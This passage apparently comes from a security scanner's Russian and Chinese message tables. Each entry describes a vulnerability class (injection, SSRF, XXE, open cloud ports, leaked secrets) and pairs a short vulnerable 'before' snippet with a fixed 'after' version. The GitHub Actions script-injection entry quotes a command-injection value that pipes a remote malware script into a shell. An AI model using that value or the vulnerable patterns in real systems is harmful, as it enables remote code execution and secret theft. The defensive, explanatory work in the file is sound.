      "Сайт перенаправляет пользователя на адрес, взятый напрямую из запроса (query, body, params), без проверки, что это известный домен. Ссылка, которая выглядит так, будто ведёт на ваш сайт, на самом деле может вести на фишинговую страницу.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Изменив число в адресе, можно увидеть чужие данные",
    description:
      "Запрос к базе данных напрямую использует идентификатор, взятый из URL (req.params.id), без проверки в соседних строках, что он принадлежит пользователю, делающему запрос. Изменив id в адресе, можно получить доступ к данным другого пользователя — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Форма входа не блокирует слишком много попыток подряд",
    description:
      "Маршрут логина определён в файле, но в том же файле нет никаких следов middleware для ограничения частоты запросов. Без ограничения на попытки злоумышленник может перебирать пароли последовательно (brute force) без замедления.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Пароли или чувствительные данные попадают в логи",
    description:
      "Вызов console.log (или аналогичный) включает переменную с именем password, token, secret или apiKey. Если эти логи попадают во внешний сервис или файл, чувствительные данные остаются открытыми гораздо дольше, чем необходимо.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "header-injection": {
    title: "Значение запроса напрямую попадает в HTTP-заголовок ответа",
    description:
      "HTTP-заголовок ответа устанавливается значением, взятым напрямую из запроса (query, body, params), без проверки, что оно не содержит перевод строки (CRLF). Злоумышленник может вставить дополнительные заголовки или даже совершенно другой ответ — response splitting, что позволяет манипулировать кешем, cookie или контентом, показываемым другим пользователям.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile не задаёт пользователя не-root",
    description:
      "В Dockerfile нет инструкции USER: без неё контейнер выполняется от root. Если злоумышленнику удастся выполнить код внутри контейнера (например, через уязвимую библиотеку), root внутри контейнера облегчает возможный побег на хост или более широкое воздействие на окружающую систему.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Манифест Kubernetes явно не требует выполнения от непривилегированного пользователя",
    description:
      'Нигде в манифесте нет "runAsNonRoot" (ни на уровне пода, ни контейнера): без этой настройки контейнер выполняется от пользователя, определённого в его образе — часто root по умолчанию, если сам образ этого не изменил. Явная установка в true приводит к сбою запуска пода, если образ всё равно пытается работать от root, вместо того чтобы узнать об этом только после инцидента.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Сторонний action в CI не закреплён на точной версии (commit SHA)",
    description:
      'Workflow использует сторонний action, на который ссылаются по тегу или ветке (например, "@v1", "@main"), вместо commit SHA. Тот, кто его поддерживает — или тот, кто скомпрометирует его аккаунт — может в любой момент переместить эту ссылку на другой коммит, незаметно изменив то, что выполняется в CI, с доступом к его секретам. Commit SHA всегда указывает на один и тот же код.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, закреплена на commit SHA — обновляйте SHA при обновлении версии`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow предоставляет себе все права токена вместо только тех, что использует",
    description:
      '"permissions: write-all" предоставляет GITHUB_TOKEN workflow права на запись ко всему — issues, pull request, пакетам, деплоям — даже если workflow использует лишь часть из этого. Если один из шагов workflow будет скомпрометирован (вредоносная зависимость, внедрённый скрипт), эти более широкие права увеличивают то, что сможет сделать тот, кто этим воспользуется.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # только права, которые workflow действительно использует`,
    },
  },
  "insecure-cookie-flags": {
    title: "Cookie сессии или аутентификации установлен без флагов Secure и HttpOnly",
    description:
      'Cookie с именем, напоминающим сессию/аутентификацию/токен, устанавливается без "httpOnly" и "secure" среди его опций. Без httpOnly JavaScript на странице — включая код, внедрённый через XSS — может прочитать этот cookie. Без secure его также можно отправить по незашифрованному HTTP-соединению.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Уязвимая зависимость:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Пока не известна исправленная версия — рассмотрите альтернативный пакет или следите за обновлениями проекта."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "Секрет записан напрямую в инструкции ENV или ARG Dockerfile",
    description:
      "Переменная с именем вроде password/secret/token/key имеет буквальное значение в инструкции ENV или ARG. В отличие от .env (который обычно не попадает в образ), это значение встраивается прямо в сам Docker-образ — любой, кто может его скачать или изучить историю слоёв, сможет его восстановить, даже если строка будет удалена в более поздней версии Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# передаётся так: docker build --build-arg DB_PASSWORD=*** (или, что ещё лучше,\n# через secret mount BuildKit, который не попадает в историю слоёв)`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Базовый образ Dockerfile использует тег ":latest"',
    description:
      'Инструкция FROM явно использует тег ":latest" вместо точной версии. "latest" меняется со временем: одна и та же сборка, повторённая в другой момент, может получить другую версию базового образа — невоспроизводимая сборка, и нежелательное обновление может прийти без того, чтобы кто-то это решил.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile скачивает удалённый файл через ADD вместо COPY",
    description:
      "Инструкция ADD с URL http/https скачивает файл из интернета во время сборки без проверки целостности и без того, чтобы содержимое было видно в репозитории. Если этот URL когда-либо будет скомпрометирован, сборка включит произвольный контент незаметно для того, кто читает Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<ожидаемый хеш>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Контейнер в манифесте Kubernetes запускается как privileged",
    description:
      '"privileged: true" в securityContext контейнера отключает почти всю обычную изоляцию между контейнером и хостом: контейнер может обращаться к устройствам хоста, менять его сетевую конфигурацию и во многих случаях фактически получить root-доступ к машине, на которой он выполняется. Почти никогда не нужно для обычного приложения.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # только по-настоящему необходимые capability`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Секрет записан открытым текстом в env-переменной манифеста Kubernetes",
    description:
      'Переменная окружения с именем вроде password/secret/token/key имеет буквальное значение ("value:") вместо чтения из Secret ("valueFrom.secretKeyRef"). Сам манифест — часто закоммиченный в репозиторий — таким образом содержит секрет открытым текстом, видимым даже тому, кто может только читать конфигурацию, не обязательно выполнять команды в кластере.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
},
  zh: {
  "supabase-service-role-in-client": {
    title: "Supabase 的密钥最终出现在面向浏览器的文件中",
    description:
      "一个带有公开前缀的变量(如 NEXT_PUBLIC_、VITE_)或客户端文件引用了 Supabase 的 service role key。这个密钥会绕过 Row Level Security：一旦进入浏览器打包文件，任何人都能读取它并以数据库管理员身份操作。",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts(仅限服务器)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "代码中直接写入了密码或密钥",
    description:
      "一个 API 密钥、令牌或密码看起来是以字面量的形式写入的，而不是从环境变量中读取。任何读取源代码(或公开仓库)的人都能获得这个密钥。",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "被分析的文件中包含项目的真实密码",
    description:
      "分析中包含了一个带有真实值的 .env 文件(而非 .env.example)。如果这个文件出现在仓库或公开部署中，其中的所有凭证都会被暴露。",
    fix: {
      before: `# .env(误提交)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example(已提交)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env 不在仓库中(.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "任何人都能读取或修改所有用户的数据",
    description:
      "Row Level Security 被禁用，或者某条策略允许任何人访问(USING (true))而不检查请求者身份。每个已认证用户——甚至匿名用户——都能读取或修改其他所有人的数据。",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "用户输入的值被直接拼接进数据库查询",
    description:
      "SQL 查询是通过直接拼接或插值字符串构建的，而不是使用参数。如果这段文本(哪怕间接地)来自用户，就可能篡改查询本身——SQL 注入。",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "密码似乎没有受到保护",
    description:
      "密码字段按请求中原样保存，文件中也没有出现任何哈希函数(bcrypt、argon2、scrypt)。一旦数据库被攻破，所有密码都能立即被使用。",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "用于签发登录凭证的密钥以明文写在代码中",
    description:
      "传给 jwt.sign / jwt.verify 的密钥(或 JWT_SECRET 变量)是代码中的字面量，而不是来自环境变量。任何读到它的人都能为任意用户伪造有效的访问令牌。",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "服务器可能被强制执行外部命令",
    description:
      "一个执行系统命令的函数(exec、execSync、spawn)接收了通过插值或拼接构建的字符串。如果这段字符串的一部分来自用户输入，控制它的人就能在服务器上执行任意命令。",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "服务器上的文件可以通过外部指定路径被读取或写入",
    description:
      '一个读取、写入或发送文件的函数，直接从请求值(query、body、params)中获取路径，而不检查它是否停留在允许的文件夹内。攻击者可以插入 "../" 来跳出预期文件夹，读取或覆盖服务器上的任意文件(例如包含凭证的配置文件)。',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("不允许的路径")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "用户输入的值在 MongoDB 查询中被当作代码执行",
    description:
      "MongoDB 的 $where 操作符会为每个文档执行服务器端 JavaScript——如果这段字符串是通过拼接用户输入构建的，控制它的人就能在数据库上下文中执行任意代码，而不仅仅是像普通 SQL 注入那样篡改过滤条件。",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "用户输入的值被当作模板而非数据来解析",
    description:
      "一个编译/渲染模板的函数，从请求值中接收了整个模板，而不是使用固定模板只传入数据。攻击者可以直接用模板引擎的语法写入(例如 Jinja2 的 {{7*7}})并在服务器上执行代码——服务器端模板注入(SSTI)，往往会导致任意命令执行，而不只是像 XSS 那样的显示问题。",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML 解析器可能被强制读取文件或发起外部请求",
    description:
      "创建 XML 解析器(DocumentBuilderFactory)时，附近代码没有显式禁用外部实体(DOCTYPE)。如果解析器接收来自不可信来源的 XML，攻击者就能定义一个外部实体来读取服务器上的文件，或让它访问攻击者指定的地址——XML 外部实体注入(XXE)。",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "密钥被直接写入 Dockerfile 的 ENV 或 ARG 指令中",
    description:
      "一个名称类似 password/secret/token/key 的变量，在 ENV 或 ARG 指令中有一个字面量值。与通常不会进入镜像的 .env 文件不同，这个值会被直接固化进 Docker 镜像本身——任何能拉取镜像或查看层历史的人都能还原出它，即便这一行在 Dockerfile 的后续版本中被删除。",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# 通过以下方式传入：docker build --build-arg DB_PASSWORD=***(或者更好的是，\n# 使用 BuildKit 的 secret mount，它不会进入层历史)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes 清单中的一个容器以 privileged 模式运行",
    description:
      '容器 securityContext 中的 "privileged: true" 几乎禁用了容器与宿主机之间所有常规隔离：容器能够访问宿主机的设备、修改其网络配置，在许多情况下实际上能获得运行它的机器的 root 权限。普通应用几乎从不需要这样做。',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 仅限真正需要的 capability`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "密钥以明文形式写在 Kubernetes 清单的环境变量中",
    description:
      '一个名称类似 password/secret/token/key 的环境变量有一个字面量值("value:")，而不是从 Secret 中读取("valueFrom.secretKeyRef")。清单本身——往往会被提交到仓库中——因此以明文形式包含了密钥，即便是只能读取配置、不一定能在集群中执行命令的人也能看到。',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraform 的安全组向整个互联网开放了一个敏感端口",
    description:
      '一条包含 0.0.0.0/0(任意 IP 地址)的 "cidr_blocks" 规则，靠近一个敏感端口——SSH(22)、RDP(3389)或典型的数据库端口(MySQL、Postgres、MongoDB、Redis、SQL Server)。互联网上的任何人都能尝试连接该服务，而不仅仅是应该访问的人。',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloud 防火墙规则向整个互联网开放了一个敏感端口",
    description:
      '一个 "google_compute_firewall" 资源的 "source_ranges" 包含 0.0.0.0/0(任意 IP 地址)，允许流量进入一个敏感端口——SSH(22)、RDP(3389)或典型的数据库端口(MySQL、Postgres、MongoDB、Redis、SQL Server)。互联网上的任何人都能尝试连接该服务，而不仅仅是应该访问的人。',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azure 网络规则向整个互联网开放了一个敏感端口",
    description:
      '一条网络安全规则("azurerm_network_security_rule"，或 "azurerm_network_security_group" 内的 "security_rule" 块)将 "source_address_prefix" 设为 "*" 或 "0.0.0.0/0"，方向为 "Inbound"、访问权限为 "Allow"，并靠近一个敏感端口——SSH(22)、RDP(3389)或典型的数据库端口。互联网上的任何人都能尝试连接该服务，而不仅仅是应该访问的人。',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # 仅限你的私有网络，或一台堡垒机\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "密钥作为 Terraform 变量的默认值被写入",
    description:
      '一个名称类似 password/secret/token/key 的变量，其 "default" 中有一个字面量值。与运行时传入的值(tfvars、TF_VAR_* 环境变量)不同，default 会进入源代码——如果仓库是共享或公开的，任何人都能看到它，即使没有 Terraform 状态的访问权限。',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # 不设默认值：应通过 .tfvars 文件(排除在 git 之外)或 TF_VAR_db_password 环境变量传入\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "外部用户可控的值直接进入 CI 的 shell 命令",
    description:
      '一个 GitHub Actions 工作流中的 "run:" 命令直接插值了诸如 pull request 标题、分支名或评论文本之类的值——这些内容任何打开 pull request 或发表评论的人都能写入，即便来自外部 fork。类似 `"; curl malware.sh | sh #` 的值会在 CI 中执行任意命令，并能访问该工作流中可用的所有密钥。',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 作为环境变量传入，绝不直接插值进命令`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "工作流以仓库密钥的访问权限运行外部 pull request 的代码",
    description:
      '该工作流使用了 "pull_request_target"——即便 pull request 来自无关的 fork，也会以基础仓库的权限和密钥运行——并且检出的是 pull request 自身的代码("github.event.pull_request.head")，而不是基础分支。打开 pull request 的人实际上就能让自己的代码在拥有这些密钥的环境中运行。',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # 检出基础分支，而不是 PR 的代码——如果不需要\n      # 更广的权限/密钥，也可以改用 "pull_request"\n      # 而不是 "pull_request_target"。\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "请求数据被以可执行代码的格式反序列化",
    description:
      "pickle(Python)、unserialize()(PHP)、ObjectInputStream(Java)或 node-serialize 库(Node)正在反序列化一个直接取自请求的值。与 JSON 不同，这些格式能在反序列化过程中本身就表示并执行代码——控制所发送值的人就能在服务器上实现任意代码执行。",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # 与 pickle 不同，JSON 在解析阶段绝不会执行代码`,
    },
  },
  "jwt-none-algorithm": {
    title: '代码明确接受未签名的 JWT 令牌("none" 算法)',
    description:
      '"none" 出现在用于验证 JWT 令牌的可接受算法列表中。使用 "none" 算法的令牌没有任何签名可供验证：任何人都能构造一个包含任意内容(例如管理员角色)的令牌，而代码会将其当作有效令牌接受。',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 绝不要把 "none" 列入可接受的算法`,
    },
  },
  "unprotected-new-table": {
    title: "一张新表似乎在没有保护的情况下被创建",
    description:
      "一次 SQL 迁移创建了一张表，但没有在同一文件中为这张表启用 Row Level Security。只要保持这种状态，这张表一诞生就没有任何关于谁能读写它的限制。",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "该网站接受来自任何其他网站的请求",
    description:
      "CORS 头被设置为接受任意来源(*)的请求，或者 cors() 中间件被无限制地使用。任何第三方网站都能从已认证用户的浏览器中调用你的 API。",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "拥有管理员权限的函数没有检查使用者身份",
    description:
      "一个名称暗示管理操作的路由或函数，在附近代码中没有包含任何身份认证或角色检查。任何知道这个 URL 的人都可能执行它。",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "该网站可能被强制执行外部代码",
    description:
      "一个发出请求的 HTTP 调用(fetch、axios)直接使用来自用户请求的值作为目标 URL。恶意用户可以让你的服务器调用内部或任意地址——服务器端请求伪造(SSRF)。",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("不允许的 URL")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "密码使用了如今很容易被破解的方法进行保护",
    description:
      "同一行代码中，md5() 或 sha1() 被应用在与密码相关的值上。这些算法计算速度太快：掌握数据库的攻击者每秒能尝试数十亿个密码。",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "用户书写的文本可能在浏览器中执行代码",
    description:
      "内容被当作原始 HTML(dangerouslySetInnerHTML、v-html、.innerHTML)插入页面，而不是作为纯文本。如果该内容包含用户输入，就可能包含在阅读页面者浏览器中执行的脚本。",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// 或者，如果确实需要 HTML：DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "上传文件的存储空间对任何人可见",
    description:
      "一个存储桶(Supabase Storage、S3)被配置为公开。如果其中包含用户上传的文档、照片或文件，任何知道——或猜到——路径的人都能在无需身份验证的情况下访问它们。",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// 使用限时签名 URL 提供文件：createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "一个链接就足以删除或修改数据",
    description:
      "一个 GET 路由执行了会改变数据的操作(路径中包含 delete/remove/update/edit)。GET 请求仅凭访问一个链接，或从外部网站加载一张图片就会被执行——这正是 CSRF 攻击的经典跳板。",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "保存在浏览器中的登录数据没有得到良好保护",
    description:
      "访问令牌被保存在 localStorage 中。与 httpOnly cookie 不同，页面上运行的任何脚本(包括通过 XSS 注入的恶意脚本)都能读取并窃取它。",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// 从服务器端将令牌设置为 httpOnly cookie：\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "该网站可能被用来重定向到诈骗网站",
    description:
      "该网站将用户重定向到一个直接取自请求(query、body、params)的地址，而不检查它是否是已知域名。一个看起来指向你网站的链接，实际上可能通向一个钓鱼页面。",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "改变地址中的一个数字就可能看到别人的数据",
    description:
      "一次数据库查询直接使用从 URL 中取得的标识符(req.params.id)，却没有在附近代码中验证它属于发起请求的用户。改变地址中的 id，就可能访问到另一个用户的数据——不安全的直接对象引用(IDOR)。",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "登录表单不会阻止连续的过多尝试",
    description:
      "文件中定义了一个登录路由，但同一文件中没有任何速率限制中间件的痕迹。没有尝试次数限制，攻击者就能连续尝试密码(暴力破解)而不会被拖慢。",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "密码或敏感数据最终出现在日志中",
    description:
      "对 console.log(或类似函数)的调用中包含了一个名为 password、token、secret 或 apiKey 的变量。如果这些日志进入外部服务或文件，敏感数据暴露的时间会远超必要范围。",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform 定义的 S3 存储桶上 Block Public Access 被禁用",
    description:
      '"aws_s3_bucket_public_access_block" 的四项保护(block_public_acls、ignore_public_acls、block_public_policy、restrict_public_buckets)中，一项或多项被设为 false。这并不意味着存储桶已经公开，但它移除了一道本可防止未来误操作将其公开的安全网。',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform 中定义的 IAM 策略授予了完全访问权限",
    description:
      '一条 action 为 "*"、resource 为 "*" 的语句，授予了对所有 AWS 服务和资源的完全访问权限——与已经在实时 IAM 状态上做过的检查相同，只是这里是在代码被实际应用之前直接从代码中读取。这可能是为紧急角色特意设置的，但需要确认：日常使用中应只授予真正需要的权限。',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Google Cloud Storage 存储桶被设置为任何人都可读取",
    description:
      '一个 "google_storage_bucket_iam_member" 或 "google_storage_bucket_iam_binding" 资源将角色授予了 "allUsers" 或 "allAuthenticatedUsers"——前者让存储桶可被互联网上的任何人读取，甚至不需要 Google 账号；后者则是任何拥有 Google 账号的人都能访问，而不仅仅是应该拥有权限的人。',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # 仅限真正应该拥有访问权限的人，而不是 allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azure 存储账户上启用了公开 blob 访问",
    description:
      '"allow_blob_public_access" 被设为 true 的 "azurerm_storage_account"：任何知道被公开的 blob/容器 URL 的人，都能在没有任何身份验证的情况下读取它。',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Google Cloud IAM 角色授予了完全访问权限(Owner/Editor)",
    description:
      '一个 "google_project_iam_binding"/"google_project_iam_member"(或组织/文件夹层级的等价资源)分配了原生角色 "roles/owner" 或 "roles/editor"——对项目中几乎所有服务的近乎完全访问权限。这可能是为紧急账号特意设置的，但需要确认：日常使用中应只授予真正需要的、更具体的预定义角色。',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
